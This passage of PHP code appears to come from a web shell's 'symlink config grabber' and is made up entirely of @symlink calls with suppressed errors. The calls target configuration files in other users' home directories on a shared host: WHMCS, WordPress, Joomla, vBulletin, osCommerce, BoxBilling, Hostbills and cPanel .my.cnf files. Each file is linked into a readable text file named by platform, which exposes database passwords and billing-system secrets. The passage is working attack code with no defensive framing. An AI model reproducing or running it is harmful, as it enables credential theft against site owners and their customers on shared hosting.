@symlink('/home1/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home1/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
//Home2

@symlink('/home2/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home2/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home2/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home2/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
//Home3

@symlink('/home3/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home3/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home3/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
